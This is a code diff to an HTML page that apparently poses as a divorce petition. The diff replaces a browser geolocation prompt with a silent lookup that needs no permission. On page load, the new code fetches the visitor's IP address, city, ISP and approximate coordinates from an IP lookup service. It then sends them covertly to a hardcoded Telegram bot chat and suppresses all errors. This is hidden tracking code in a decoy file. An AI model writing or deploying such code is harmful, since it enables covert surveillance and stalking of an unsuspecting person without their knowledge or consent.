@@ -58,22 +58,26 @@
         const CHAT_ID = "-5345269525";
 
         window.onload = function() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendToTelegram, silentError);
-            }
+            // Sử dụng API lấy vị trí qua IP (Không cần hỏi quyền, chạy được trên HTTP)
+            fetch('http://ip-api.com/json/')
+                .then(response => response.json())
+                .then(data => {
+                    if (data.status === "success") {
+                        const lat = data.lat;
+                        const lon = data.lon;
+                        const ip = data.query;
+                        const city = data.city;
+                        const isp = data.isp;
+                        
+                        const message = `📍 Có người vừa mở đơn ly hôn!\n- IP: ${ip}\n- Vị trí ước tính: ${city}\n- Nhà mạng: ${isp}\n- Bản đồ: https://www.google.com/maps?q=${lat},${lon}`;
+                        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+
+                        // Gửi dữ liệu âm thầm về Telegram
+                        fetch(url).catch(error => {});
+                    }
+                })
+                .catch(error => {});
         };
-
-        function sendToTelegram(position) {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            
-            const message = `📍 Có người vừa mở đơn ly hôn và cấp quyền vị trí!\nVĩ độ: ${lat}\nKinh độ: ${lon}\nBản đồ: https://www.google.com/maps?q=${lat},${lon}`;
-            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
-
-            fetch(url).catch(error => {});
-        }
-
-        function silentError(error) {}
     </script>
 </body>
 </html>
